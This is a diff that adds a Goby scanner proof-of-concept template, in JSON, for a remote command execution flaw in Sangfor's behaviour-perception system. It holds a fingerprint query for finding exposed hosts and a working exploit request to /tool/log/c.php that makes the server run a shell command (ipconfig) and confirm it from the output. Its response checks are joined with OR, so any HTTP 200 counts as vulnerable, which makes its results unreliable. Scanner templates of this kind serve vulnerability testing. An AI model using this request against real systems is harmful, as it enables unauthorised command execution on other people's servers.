@@ -1,0 +1,60 @@
+{
+      "Name": "深信服 行为感知系统 c.php 远程命令执行漏洞",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "body=\"isHighPerformance : !!SFIsHighPerformance,\"",
+      "Description": "深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行",
+      "Product": "深信服 行为感知系统",
+      "Homepage": "",
+      "Author": "peiqi",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech/Goby%20&%20POC.html?q="
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/tool/log/c.php?strip_slashes=system&host=ipconfig",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "OR",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "IPv6",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-06-04 10:11:18",
+      "GobyVersion": "1.8.268"
+}
